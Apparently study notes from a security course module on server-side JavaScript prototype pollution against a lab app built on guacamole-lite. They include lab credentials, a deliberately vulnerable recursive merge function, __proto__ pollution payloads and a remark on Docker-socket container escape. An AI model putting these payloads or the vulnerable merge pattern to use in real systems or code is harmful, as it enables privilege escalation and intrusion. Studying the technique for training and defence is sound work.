
Prototype pollution refers to a vulnerability in JavaScript that allows an attacker to inject properties into every object created by an application. While prototype pollution is not a new concept in JavaScript, it has only recently become an attack vector. In a presentation at the NorthSec conference in October 2018, Olivier Arteau popularized the method of leveraging prototype pollution for server-side attacks. This module will focus on these server-side attacks. While client-side prototype pollution attacks also exist, they are slightly different from server-side attacks.


Prototype pollution vulnerabilities often occur in libraries that merge or extend objects. For a web application to have an exploitable prototype pollution vulnerability, it must use a vulnerable merge/expand function and provide a means to execute code or bypass authentication by leveraging an injected attribute.
For example, modify the public prototype:
``` JavaScript
const user1 = {};
const user2 = {};

Object.prototype.isAdmin = true;

console.log(user1.isAdmin);  // true
console.log(user2.siAdmin);  // true
```
Although neither `user1` nor `user2` themselves have an `isAdmin` attribute, they are both found along the prototype chain:
``` js
Object.prototype.isAdmin
```
So both objects look like they have:
```js
isAdmin = true
```
- This is "pollution": an attacker writes malicious properties into a shared prototype, affecting all objects that inherit from that prototype.


Because this method of exploitation is difficult, most discussions on the topic online are theoretical.

To demonstrate the vulnerability in action, we created a Node using _guacamole-lite_ [2](https://portal.offsec.com/courses/web-300-687/learning/guacamole-lite-prototype-pollution-32494/guacamole-lite-prototype-pollution-32532#fn-local_id_2-2) for connecting RDP clients through a browser. package) and basic applications for various template engines. guacamole-lite uses a library that is vulnerable to prototype pollution attacks when handling untrusted user input. We will use prototype pollution to attack two different template engines to achieve remote code execution (RCE) on the target system.

We will use a white box approach to explain these concepts, but we will also cover how to use black box concepts to find such vulnerabilities.

# 10.1 Initial setup
To demonstrate this vulnerability, we created a target application called "Chips" that provides access to an RDP client through a web interface.

Before we start exploiting the vulnerability, let's explore the target application, find the inputs, switch the template engine, and connect to it via a remote debugger.

In order to access the Chips server, we created a hosts file entry named "chips" on the Kali Linux virtual machine. Please replace this entry with the appropriate IP address on your Kali machine so we can continue. Before you begin, be sure to restore the Chips virtual machine from the Labs page. Credentials for the Chips server are shown below.

|URL|Username|Password|
|---|---|---|
|http://chips/|||
|ssh://chips|student|studentlab|

First, visit the Chips homepage to browse the app. We will use Burp Suite and its browser to capture the request.

After the connection is successful, the page will display some container information, allowing us to change the connection settings and connect to the RDP client. The "`About`" section says "Your development environment is at your doorstep. Click Connect to start your session." Such applications can be used in demo development environments.
![[Pasted image 20260728100549.png]]

After clicking "`Connect`" the application loads a new page showing the RDP client's desktop.
![[Pasted image 20260728100623.png]]

By looking at the requests in the Burp HTTP history, we found three interesting requests. First, we discovered a POST request to /token that contained a JSON payload with connection information.
![[Pasted image 20260728100637.png]]

Next, we find a request to /rdp whose _token_ query parameter contains a base64-encoded payload. After decoding, the payload appears as a JSON object containing the "iv" and "value" parameters. Based on the presence of the "iv" parameter, we can infer that the payload is encrypted. This [point](https://portal.offsec.com/courses/web-300-687/learning/guacamole-lite-prototype-pollution-32494/getting-started-32521/getting-started-32533#fn-local_id_3-1) will be important later.
![[Pasted image 20260728100717.png]]

Finally, we also discovered a GET request to /guaclite with the same token value as previously discovered. The request returned a "101 Switching Protocols" response, which is used to initiate a WebSocket connection.
![[Pasted image 20260728101758.png]]

Given that we did not find any HTTP requests transmitting image, sound, and mouse movement data to the RDP client, we can infer that this data is transmitted over a WebSocket connection. We can confirm this by clicking on WebSocket History in Burp Suite and viewing the captured information.
![[Pasted image 20260728100835.png]]

Returning to the browser homepage, we also find an "Advanced Connection Settings" button, which displays the settings included in the "/token" request.
![[Pasted image 20260728100859.png]]

We'll focus on the three endpoints we discovered, starting with a source code review of each.

## 10.1.1 Understanding the code

First, we use rsync to download the code to our Kali machine.
```
kali@kali:~$ rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/
student@chips's password: 
```

Next, we'll open the source code in Visual Studio Code.
```
kali@kali:~$ code -a chips/
```

The downloaded code has the following folder structure:
```
chips/
├── app.js
├── bin
│   └── www
├── docker-compose.yml
├── Dockerfile
├── .dockerignore
├── frontend
│   ├── index.js
│   ├── rdp.js
│   ├── root.js
│   └── style
├── node_modules
│   ├── abbrev
│   ├── accepts
    ...
├── package.json
├── package-lock.json
├── public
│   ├── images
│   └── js
├── routes
│   ├── files.js
│   ├── index.js
│   ├── rdp.js
│   └── token.js
├── settings
│   ├── clientOptions.json
│   ├── connectionOptions.json
│   └── guacdOptions.json
├── shared
│   └── README.md
├── version.txt
├── views
│   ├── ejs
│   ├── hbs
│   └── pug
├── .vscode
│   └── launch.json
└── webpack.config.js
```

The presence of `bin/www`, `package.json` and `routes/` directories indicates that this is a NodeJS web application. In particular, the `package.json` file identifies a NodeJS project and manages its dependencies.

The presence of `docker-compose.yml` and `Dockerfile` files indicates that the application was launched using a Docker container.

Check out the `package.json` file for more information about the application.
``` json
01  {
02    "name": "chips",
03    "version": "1.0.0",
04    "private": true,
05    "scripts": {
06      "start-dev": "node --inspect=0.0.0.0 ./bin/www",
07      "watch": "webpack watch --mode development",
08      "start": "webpack build --mode production && node ./bin/www",
09      "build": "webpack build --mode development"
10    },
11    "devDependencies": {
12      "@babel/core": "^7.13.1",
...
24      "webpack": "^5.24.2",
...
33    },
34    "dependencies": {
35      "cookie-parser": "~1.4.4",
36      "debug": "~2.6.9",
37      "dockerode": "^3.2.1",
38      "dotenv": "^8.2.0",
39      "ejs": "^3.1.6",
40      "express": "~4.16.1",
41      "guacamole-lite": "0.6.3",
42      "hbs": "^4.1.1",
43      "http-errors": "~1.6.3",
44      "morgan": "~1.9.1",
45      "pug": "^3.0.2"
46    }
47  }
```

We can learn three things from the package.json file. First, the application is launched via the `./bin/www` file (line 6).

Second, we find that Webpack is installed (lines 7-10 and 24). Webpack is typically used to package external client packages (such as jQuery, Bootstrap, etc.) and custom JavaScript code into a single file to be served by a web server. This means that the frontend directory most likely contains all front-end resources, including the code to initiate a WebSocket connection.

Finally, the application is built using the Express web application framework (line 40). This means that the routes directory most likely contains the endpoint definitions we discovered earlier.

Analyze `./bin/www` to understand how the application is started.
``` js
01  #!/usr/bin/env node
...
07  var app = require('../app');
08  var debug = require('debug')('app:server');
09  var http = require('http');
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
13
...
25  var server = http.createServer(app);
26
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
28
29  /**
30   * Listen on provided port, on all network interfaces.
31   */
32
33  server.listen(port);
34  server.on('error', onError);
35  server.on('listening', onListening);
...
```

From this file we can see that app.js is loaded and used to create the server. Note that ".js" is omitted from the require statement. On lines 33-35, the HTTP server starts. However, before starting, the server is also passed to the `GuacamoleLite` constructor (line 27). This may cause the guacamole-lite package to create undefined endpoints in Express.

`app.js` file
``` js
01  var createError = require('http-errors');
02  var express = require('express');
03  var path = require('path');
...
11
13  var app = express();
14
15  // view engine setup
16  t_engine = process.env.TEMPLATING_ENGINE;
17  if (t_engine !== "hbs" && t_engine !== "ejs" && t_engine !== "pug" )
18  {
19      t_engine = "hbs";
20  }
21
22 app.set('views', path.join(__dirname, 'views/' + t_engine));
23 app.set('view engine', t_engine);
...
30
31  app.use('/', indexRouter);
32  app.use('/token', tokenRouter);
33  app.use('/rdp', rdpRouter);
34 app.use('/files', filesRouter);
...
```

The app.js file sets up many parts of the application. Most importantly, we find that two of the routes are defined on lines 32 and 33. We also find that lines 16-20 allow us to set the application's template engine to `hbs` _ (_ Handlebars), `EJS` or `Pug`, with the default value being `hbs`. This is set via the `TEMPLATING_ENGINE` environment variable. This is an unusual feature for web applications. However, we added it to the application to make it easier for us to switch between different template engines. We will use this feature to demonstrate various ways to attack an application with prototype pollution.
> hbs is the Handlebars framework implemented for Express. However, it uses the original Handlebars library. From now on, we will use "Handlebars" to refer to this template engine.

To show how to change the template engine, we will look at the docker-compose.yml file to better understand the layout of the application.
``` yml
1	 version: '3'
2	 services:
3	   chips:
4	     build: .
5	     command: npm run start-dev
6	     restart: always
7	     environment:
8	       - TEMPLATING_ENGINE
9	     volumes:
10	      - .:/usr/src/app
11	      - /var/run/docker.sock:/var/run/docker.sock
12	    ports:
13	      - "80:3000"
14	      - "9229:9229"
15	      - "9228:9228"
16	  guacd:
17	    restart: always
18	    image: linuxserver/guacd
19	    container_name: guacd
20	
21	  rdesktop:
22	    restart: always
23	    image: linuxserver/rdesktop
24	    container_name: rdesktop
25      volumes:
26        - ./shared:/shared
27	    environment:
28	      - PUID=1000
29	      - PGID=1000
30	      - TZ=Europe/London
```

Line 5 indicates that we can start the application using the start-dev script (located in the package.json file). This script starts the application on port 9229 and enables debug mode. In a production environment, this setting should not be enabled, but is enabled here to facilitate debugging when trying to exploit the target vulnerability.

Line 8 of the file also references the TEMPLATING_ENGINE environment variable. We can set this variable from the command line before running the docker-compose command.

Finally, we find that the web application container (chips) starts with `/var/run/docker.sock` mounted (line 11). This gives the chips container full access to the Docker socket. If we can gain remote code execution (RCE) for a web application container, [then](https://portal.offsec.com/courses/web-300-687/learning/guacamole-lite-prototype-pollution-32494/getting-started-32521/understanding-the-code-32534#fn-local_id_4-2) by accessing Docker socket, we might be able to escape the container and perform remote code execution on the host. We can remember this, but first we need to focus on understanding the application.

Let's try changing the template engine. First, we will stop the existing application instance using the `docker-compose down` command.
```
kali@kali:~$ ssh student@chips
...
student@oswe:~$ cd chips/

student@oswe:~/chips$ docker-compose down
Stopping chips_chips_1   ... done
Stopping rdesktop        ... done
Stopping guacd           ... done
Removing chips_chips_1                ... done
Removing chips_chips_run_b082290a7ff7 ... done
Removing rdesktop                     ... done
Removing guacd                        ... done
Removing network chips_default
```

After the application is stopped, we can start it and set TEMPLATING_ENGINE=ejs before running the `docker-compose up` command. This will instruct app.js to use the EJS template engine and the views in the `views/ejs` folder. Launching the application should only take a few seconds. When the logs start to decrease, the application should have started.
```
student@oswe:~/chips$ TEMPLATING_ENGINE=ejs docker-compose up
Starting rdesktop        ... done
Starting chips_chips_1   ... done
Starting guacd           ... done
Attaching to guacd, chips_chips_1, rdesktop
guacd       | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
...
guacd       | [services.d] done.
rdesktop    | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
....
rdesktop    | [services.d] done.
chips_1     | 
chips_1     | > app@0.0.0 start-dev /usr/src/app
...
chips_1     | Starting guacamole-lite websocket server
```

The application adds annotations for all template engines in the view. We will use these annotations to differentiate between different template engines.
```
kali@kali:~$ curl http://chips -s | grep "<\!--"
        <!-- Using EJS as Templating Engine -->
```

We currently run Chips using the EJS template engine. I will use this configuration for now, I will change the engine in the module later.

Next, we'll make sure the remote debugging functionality works as expected.

#### Exercises

1. Reconfigure the Chips instance to use EJS instead of the default Handlebars.
2. View the three JavaScript files in `routes/` to understand the role of each file.

##### `index.js`

``` js
var express = require('express');
var router = express.Router();
var Docker = require('dockerode');
const { names } = require('debug');
var docker = new Docker({socketPath: '/var/run/docker.sock'});

const defaultSettings = require("../settings/connectionOptions.json")

/* GET home page. */
router.get('/', function(req, res, next) {   // 在当前路由器上注册一个 GET 请求处理函数。
  docker.listContainers(function (err, containers) {
    containers.forEach(function (containerInfo) {
      if(containerInfo.Names.includes("/rdesktop")){
        containerInfo.Name = containerInfo.Names[0].replace("/", "");
        res.render('index', { title: 'Chips - Home', container: containerInfo, s: defaultSettings });
      }
    })
  });
});

module.exports = router;

```
1. Load the Express module through `require()`
2. `var router = expres.Router()`, create an Express router object
3. Load the dockerode module through `require()`
dockerode is a Node.js Docker API client that allows JavaScript programs to perform operations through the Docker API.
4. `const { names } = require('debug');`
This line uses object destructuring syntax, which means:
``` js
const debugModule = require('debug');
const names = debugModule.names;
```

5. `var docker = new Docker({socketPath: '/var/run/docker.sock'});`
Create a Docker API client instance. The incoming configuration is: `{socketPath: '/var/run/docker.sock'}`,
Indicates not to connect to Docker via TCP, but via Unix Socket:
```
/var/run/docker.sock
```
Connect to the local Docker daemon.

6.
```
docker.listContainers(function (err, containers) {
```
- Call the Docker API to get the container list.
`listContainers()` is an asynchronous operation, so it does not return the result immediately, but passes in a callback function:
```
function(err, containers) {
    ...
}
```
This function will not be executed until the Docker daemon returns the result.




##### file.js

``` js
var express = require('express');
var router = express.Router();
const fs = require('fs')
var path = require('path');



router.get('/*', function(req, res, next) {    // '/*' 中的 * 是通配符，表示匹配斜杠后面的任意内容。
  let fileName = req.params["0"].split("../").join("")
  let filePath = path.join(__dirname, '../shared/' + fileName);
  res.download(filePath);
});

module.exports = router;

```

- `const fs = require('fs')`
Import the Node.js built-in file system module `fs`.
`fs` can be used:
- read files
- write to file
- Delete files
- Determine whether the file exists
- Get file information

- `let filePath = path.join(__dirname, '../shared/' + fileName);`
Constructs the full path to the file to download.
in:
```
__dirname
```
It is a special variable provided by Node.js and represents the absolute path of the directory where the current JavaScript file is located.
Assume that the current routing file is located at:
```
/app/routes/download.js
```
So:
```
__dirname
```
that is:
```
/app/routes
```



##### rdp.js

``` js
var express = require('express');
var router = express.Router();
const crypto = require('crypto');

router.get('/', function(req, res, next) {
  res.render('rdp', { title: 'Connection' });
});

module.exports = router;
```


##### token.js

``` js
var express = require('express');
var router = express.Router();
const crypto = require('crypto');

const clientOptions = require("../settings/clientOptions.json")   // 读取配置文件，通常包含加密算法和密钥。

const encrypt = (value) => {    // 定义加密函数，参数为需要加密的数据。
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(clientOptions.crypt.cypher, clientOptions.crypt.key, iv);  //  使用配置中的算法、密钥和 IV 创建加密器。

  let crypted = cipher.update(JSON.stringify(value), 'utf8', 'base64');   // 先将对象转成 JSON，再加密并输出 Base64。
  crypted += cipher.final('base64');


  const data = {
      iv: iv.toString('base64'),
      value: crypted
  };

  return new Buffer.from(JSON.stringify(data)).toString('base64');   // 将整个对象再次转为 Base64
};

router.post('/', function(req, res, next) {
  console.log(clientOptions);
  token = encrypt(req.body);
  res.json({"token": token});
});

module.exports = router;

```

`clienOptions.json`
``` json
{
	"crypt": {
		"cypher": "AES-256-CBC",
		"key": "MySuperSecretKeyForParamsToken12"
	}
}
```



## 10.1.2 Configure remote debugging

A `.vscode/launch.json` file is provided in the Chips source code, which can be used to quickly set up debugging. We need to update two of the address fields to point to the remote server.
``` json
{

	"version": "0.2.0",
	"configurations": [
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote",
			"address": "chips",
			"port": 9229,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		},
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote (cli)",
			"address": "chips",
			"port": 9228,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		}
	]
}
```

Two remote debugging profiles have been configured. The first configuration file uses port 9229. The application has been started using the _start-dev_ script in package.json, which starts Node.js on port 9229. In order to verify that it is working properly, we need to navigate to the Run and Debug tab in Visual Studio Code and launch the profile.

![[Pasted image 20260728132854.png]]

Once remote debugging is connected, the debug console will display "Starting guacamole-lite websocket server" and the bottom bar will turn orange.
![[Pasted image 20260728132933.png]]

We can disconnect by clicking the "Disconnect" button near the top of VS Code.
![[Pasted image 20260728132945.png]]

Next, we'll try connecting via the command line interface (CLI). Later in this module, we'll use the Node CLI with debugging capabilities to understand how prototype pollution and the template engine work.

First, we have to start Node.js from the web application container in a new terminal window (and enable debug mode). To do this, we will open a new SSH session to the chip server and use docker-compose with the exec command.

While we can go into the ~/chips directory and let docker-compose automatically find the docker-compose.yml file, we can also pass the file using the -f flag.

Next, we will tell docker-compose that we want to execute a command on the chips container (as defined in docker-compose.yml). The command we want to execute is `node --inspect=0.0.0.0:9228`

, the purpose is to start an interactive shell and open port 9228 for remote debugging.

```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
>
```

Next, we can select the `Attach to remote (cli)` configuration in Visual Studio Code and start debugging.

The IDE bottom bar will turn orange again and debugging will begin. The `Debugger attached` message should also appear in the interactive Node shell.

The benefit of debugging via CLI is that we can now set breakpoints in individual libraries, load them in the interactive CLI and run individual methods without having to modify the web application and reload after each test.

Once remote debugging is configured, we can start exploring how JavaScript prototypes work and how to exploit prototype pollution vulnerabilities.

#### Exercises

Configure remote debugging via CLI and web application.

# 10.2 Introduction to JavaScript prototypes

Before discussing JavaScript prototypes, we must first understand: almost everything in JavaScript is an object. This includes arrays, browser APIs, and functions. The only exceptions are `null`, `undefined`, strings, numbers, booleans and Symbols.

Unlike other object-oriented programming languages, JavaScript is not considered a class-based language. As of the ES2015 standard, JavaScript does support class declarations; however, the `class` keyword in JavaScript is just a helper feature to make existing JavaScript implementations more understandable to users of class-based programming.

We can verify this by creating a class and checking its type. You can use the interactive Node shell created in the previous section, or you can start a new shell.

```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> class Student {
...     constructor() {
.....     this.id = 1;
.....     this.enrolled = true
.....   }
...     isActive() {
...             console.log("Checking if active")
...             return this.enrolled
...     }
... }
undefined

> s = new Student
Student { id: 1, enrolled: true }

> s.isActive()
Checking if active
true

> typeof s
'object'

> typeof Student
'function'
```

In the above example, we discovered that the `Student` class is actually a function. What does this mean? Prior to ES2015, classes were created via constructors.

```
> function Student() {
...     this.id = 2;
...     this.enrolled = false
... }
undefined
>

> Student.prototype.isActive = function() {
...     console.log("Checking if active")
...     return this.enrolled;
... };
[Function (anonymous)]

> s = new Student
Student { id: 2, enrolled: false }

> s.isActive()
Checking if active
false

> typeof s
'object'

> typeof Student
'function'
```

The `class` keyword in JavaScript is just syntactic sugar for constructors.

Both classes and constructors use the `new` keyword to create objects from a class. Here's how this keyword works.

According to the documentation, JavaScript's `new` keyword first creates an empty object. In that object, it sets the value of `__proto__` to the constructor's `prototype`, which is where we set `isActive`. After setting `__proto__`, the `new` keyword ensures that `this` points to the context of the newly created object. The above example shows that the new object's `this.id` and `this.enrolled` are set to the corresponding values. Finally, `this` is returned unless the function returns an object itself.

For people familiar with other object-oriented languages ​​such as C# and Java, the usage of `prototype` and `__proto__` can be confusing.

Many object-oriented languages ​​(such as Java) use a class-based inheritance model: a blueprint (class) is used to instantiate a single object, and the object represents something in the real world. The car we have (a real-world object) inherits from the `Car` class (a blueprint), which contains methods for moving, braking, turning, etc.

In this class-based inheritance model, we can run the `move()` function on a `Car` object that inherits from the `Car` class. However, you cannot run `move()` directly in the `Car` class as it is just a blueprint for other classes. We also cannot inherit from multiple classes, such as inheriting both the vehicle class and the robot class to create a half-car, half-robot Transformer.

However, JavaScript uses prototypal inheritance, which means that one object inherits properties from another object. Looking back at the previous example, `Student` is a function (don't forget that functions are objects too). When creating an `s` object, the `new` keyword is inherited from the `Student` object.

JavaScript's prototypal inheritance has many advantages. First, an object can inherit properties from multiple objects. Additionally, properties inherited from higher-level objects can be modified at runtime. This allows us, for example, to create the required Transformers and dynamically modify their `attack()` function for each Transformer's unique capabilities.

The ability to modify the inherited properties of a set of objects is very powerful for developers; but if not handled correctly, this ability can also be used to exploit applications.

This inheritance creates a prototype chain. MDN Web Docs summarizes it as follows:

> When it comes to inheritance, JavaScript has only one structure: objects. Every object has a private property that holds a link to another object called its prototype. This prototype object also has its own prototype, and so on until we reach an object whose prototype is `null`. By definition, `null` has no prototype and serves as the last link in this prototype chain.

Note that `__proto__` is part of the prototype chain, while `prototype` is not. Remember that the `new` keyword sets `__proto__` to the `prototype` of the constructor.

Earlier we set the `isActive` prototype of `Student` to a function that logs messages to the console and returns the `Student` status. Therefore, it is not surprising that the `isActive` function can be called directly from the "class".

```
> Student.prototype.isActive()
Checking if active
undefined
```

As expected, the function executes and logs a message to the console; since `enrolled` is not set in the prototype instance, `undefined` is returned. However, if you try to access `isActive` in the `Student` function constructor rather than in the prototype, the function is not found.

```
> Student.isActive
undefined
```

This is because `prototype` does not belong to the prototype chain, but `__proto__` does. When `isActive` is run on an `s` object, the function in `s.__proto__.isActive()` is actually run, where the `this` context is correctly bound to the value in the object. We can verify this by creating a new `isActive` function directly in the `s` object instead of running the function in `__proto__`. Then delete the new `isActive` function and watch the prototype chain resolve the original `isActive` function from `__proto__`.

```
> s.isActive()
Checking if active
false

> s.isActive = function(){
... console.log("New isActive");
... return true;
... }
[Function (anonymous)]

> s.isActive()
New isActive
true

> s.__proto__.isActive()
Checking if active
undefined

> delete s.isActive
true

> s.isActive()
Checking if active
false
```

When we set `isActive` directly on the `s` object, `__proto__.isActive` is not executed.

An interesting thing about this chain is that when `Student.prototype.isActive` is modified, `s.__proto__.isActive` will also change accordingly.

```
> Student.prototype.isActive = function () {
... console.log("Updated isActive in Student");
... return this.enrolled;
... }
[Function (anonymous)]

> s.isActive()
Updated isActive in Student
false
```

When `s.isActive()` is called, the updated function is executed because the `isActive` function is a link from the `__proto__` object to the `Student` prototype.

Continuing to look at the `s` object, you will find that there are some functions that we have not set but are available, such as `toString`.

```
> s.toString()
'[object Object]'
```

The `toString` function returns the string representation of the object. This function is a built-in function in the `Object` class prototype.

Note that `Object` (capital O) refers to the `Object` data type class. `s` is an object that inherits properties from the `Student` class; and the `Student` class inherits properties from the `Object` class because almost everything in JavaScript is an Object.

```
> o = new Object()
{}

> o.toString()
'[object Object]'

> {}.toString()
'[object Object]'
```

You can add a more practical `toString` to an object by setting `toString` in the prototype of the `Student` constructor.

```
> s.toString()
'[object Object]'

> Student.prototype.toString = function () {
... console.log("in Student prototype");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in Student prototype
'2'
```

The `toString` function now returns the Student's id as a string.

As demonstrated previously, it is also possible to add `toString` directly to the `s` object.

```
> s.toString = function () {
... console.log("in s object");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in s object
'2'
```

At this point, there are three `toString` functions in the object's prototype chain: the first in the Object class prototype, the second in the `Student` prototype, and the last one directly in the `s` object. The prototype chain selects the function found first during the search, in this case the function in the `s` object. If you create a new object from the `Student` constructor, which `toString` method is used by default when called?

```
> s2 = new Student()
Student { id: 2, enrolled: false }

> s2.toString()
in Student prototype
'2'
```

The new `Student` object will use the `toString` method in the `Student` prototype.

What happens if you modify the `toString` function in the Object class prototype?

```
> Object.prototype.toString = function () {
... console.log("in Object prototype")
... return this.id.toString();
... }
[Function (anonymous)]

> delete s.toString
true

> delete Student.prototype.toString
true

> s.toString()
in Object prototype
'2'
```

Here `toString` is set as a function that records the message and returns the id. We also removed the other `toString` functions in the chain to ensure that functions in Object are executed. After running `s.toString()`, you can find that the `toString` function in the Object prototype is actually run.

Remember what we discovered earlier: even a newly created Object will get an updated prototype after the prototype in the constructor is modified; and almost everything in JavaScript is created from Object. Now let's check the `toString` function of an empty object.

```
> {}.toString()
in Object prototype
Uncaught TypeError: Cannot read property 'toString' of undefined
    at Object.toString (repl:3:16)
```

Since the empty object has no id, you get the error. However, with this error and the `in Object prototype` message, we know that what is being executed is a custom function created in the Object prototype.

At this point, we have polluted the prototype of almost every object in JavaScript and modified the function every time we executed `toString`.

These modifications to `toString` only affect the current interpreter process, but will continue to affect that process until it is restarted. To clear this change, you must exit the Node interactive CLI and start a new interactive session.

Node web applications will be affected in the same way. Once a prototype is tainted, it remains in that state until the application is restarted or crashes, which causes a restart.

Next we discuss how to exploit prototype contamination.

#### Exercises

Explain the following:

```
> Object.toString()
'function Object() { [native code] }'
```
- Object is essentially a function, so if you call it toString, you will get a function

```
> (new Object).toString()
'[object Object]'
```
- `new Object` creates a normal object. The object itself does not have `toString`, so it inherits from `Object.prototype`. If you put it toString, you will get `object Object`. What is actually called is `Object.prototype.toString`

```
> (new Function).toString()
'function anonymous(\n) {\n\n}'
```
- Created a normal function, but this function does not have `toString`, so it is found from the upper level, that is, `Function.prototype`, and then inherited.

```
> {}.__proto__.toString = "breaking toString"
'breaking toString'
```
- `{}.__proto__` is equivalent to `Object.prototype`, `Object.prototype.toString` is assigned to a string

```
> (new Object).toString()
Uncaught TypeError: (intermediate value).toString is not a function
```
- Create a normal object, which does not have toString itself, and continues to inherit from the superior (`Object.prototype`). It has been assigned to a string before. If `.toString()` is added to the string, an error will be reported.

```
> (new Function).toString()
'function anonymous(\n) {\n\n}'
```
- Create a normal function. This function does not have `toString()` and will look for it from the superior `Function.prototype`. If the superior exists, it will return normally. If it does not exist, it will continue to find the superior of the superior, that is, `Object.prototype`.

```
> (new Function).__proto__.toString()
'function () { [native code] }'
> Object.toString()
'function Object() { [native code] }'

(new Function).prototype.toString() == (new Object).toString()
```

As shown above, when overriding `toString` in the Object prototype, the `toString` function of Function is not overridden. What's the reason?
The reason is: `Function.prototype` has already defined `toString` itself, which will obscure the higher-level `Object.prototype.toString`.
```
某个函数
   ↓
Function.prototype   ← 自己有 toString
   ↓
Object.prototype     ← 也有 toString
   ↓
null
```


## 10.2.1 Prototype Pollution

Prototype contamination is not always considered a safety issue. In fact, it has been used by third-party libraries to extend the functionality of JavaScript. For example, a library could add a `first` function for all arrays, `toISOString` for all Date s, and `toHTML` for all objects.

However, this creates issues with future compatibility of the code, as any native implementation that comes later will be replaced by a less efficient third-party API. Even so, this is not a security issue per se.

However, security issues arise if the application accepts user input and allows us to inject content into the Object's prototype.

Although many situations can cause this problem, it usually occurs in functions of type `extend` or `merge`. These functions merge objects to create new merged or extended objects.

For example, consider the following code:

``` js
const { isObject } = require("util");

function merge(a,b) {
	for (var key in b){
		if (isObject(a[key]) && isObject(b[key])) {
			merge(a[key], b[key])
		}else {
			a[key] = b[key];
		}
	}
	return a
}
```

The `merge` function above takes two objects and iterates over each key in the second object. If the values ​​for that key in the first and second objects are also objects, the function calls itself recursively, passing in both objects. If they are not objects, the computed property name is used to set the value of the key in the first object to the value of the key in the second object.

Using this method, two objects can be merged:

``` js
> const { isObject } = require("util");
undefined
> function merge(a,b) {
... 	for (var key in b){
..... 		if (isObject(a[key]) && isObject(b[key])) {
....... 			merge(a[key], b[key])
....... 		}else {
....... 			a[key] = b[key];
....... 		}
..... 	}
... 	return a
... }
undefined

> x = {"hello": "world"}
{ hello: 'world' }

> y = {"foo" :{"bar": "foobar"}}
{ foo: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world', foo: { bar: 'foobar' } }
```

Things get interesting when the `"__proto__"` key in the second object is set to another object.

``` js
> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }
```

The square brackets around `"__proto__"` ensure that `__proto__` is enumerable. Setting the value in this way sets `isProtoSetter` to false, making the object enumerable by the `for` loop in the `merge` function.

When the `merge` function is executed, it iterates over all the keys in the `y` object. The only key in this object is `"__proto__"`.

Since `x["__proto__"]` is always an object (remember, it is a link to the prototype of the parent object) and `y["__proto__"]` is also an object (because we made it an object), the `if` statement is true. This means that the `merge` function is called with `x["__proto__"]` and `y["__proto__"]` as arguments.

When the merge function is executed again, the `for` loop will enumerate the keys of `y["__proto__"]`. The only attribute of `y["__proto__"]` is `"bar"`. Since the property does not exist in `x["__proto__"]`, the `if` statement is false and the `else` branch is executed. The `else` branch sets the value of `x["__proto__"]["bar"]` to the value of `y["__proto__"]["bar"]`, which is `"foobar"`.

However, `x["__proto__"]` points to the Object class prototype, so the merge pollutes all objects. This can be observed by inspecting the value of `bar` in the newly created object.

``` js
> {}.bar
'foobar'
```

Obviously, it can get dangerous if you start adding properties like `"isAdmin"` to all your objects. If the application is written a certain way, all users suddenly become administrators.

Even if an object's `__proto__` is the prototype of a user-defined class (as in the previous `Student` example), you can concatenate multiple `"__proto__"` keys until you reach the Object class prototype:

``` js
> delete {}.__proto__.bar
true

> function Student() {
... this.id = 2;
... this.enrolled = false
... }
undefined

> s = new Student
Student { id: 2, enrolled: false }

> s2 = new Student
Student { id: 2, enrolled: false }

> x = {"foo": "bar"}
{ foo: 'bar' }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> x = {["__proto__"]: { "foo": "bar" }}
{ __proto__: { foo: 'bar' } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
undefined

> s.foo
'bar'

> s2.foo
'bar'
```

In this example, making the `"__proto__"` object only one level deep actually only interacts with the prototype of the `Student` class. Therefore, the `foo` value of both `s` and `s2` is set to `"bar"`.

``` js
> x = {["__proto__"]: { ["__proto__"]: {"foo": "bar" }}}
{ __proto__: { __proto__: { foo: 'bar' } } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
'bar'
```

However, when a `"__proto__"` object is made multiple levels deep, it starts interacting with objects higher up in the prototype chain. At this point, all objects start to have `foo` with the value `"bar"`.

Note that for the merge function to be both vulnerable and work properly, it must call itself recursively when the values ​​of the keys are both objects. For example, the following code is not vulnerable and does not merge two objects correctly:

``` js
function badMerge (a,b) {
  for (var key in b) {
    a[key] = b[key];
  }
  return a
}
```

Such a function is not a true merge function since it does not merge objects recursively.

``` js
> delete {}.__proto__.foo
true

> function badMerge (a,b) {
...   for (var key in b) {
.....     a[key] = b[key];
.....   }
...   return a
... }
undefined

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> merge(x,y)
{ foo: { bar: 'foobar', hello: 'world' } }

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> badMerge(x,y)
{ foo: { hello: 'world' } }
```

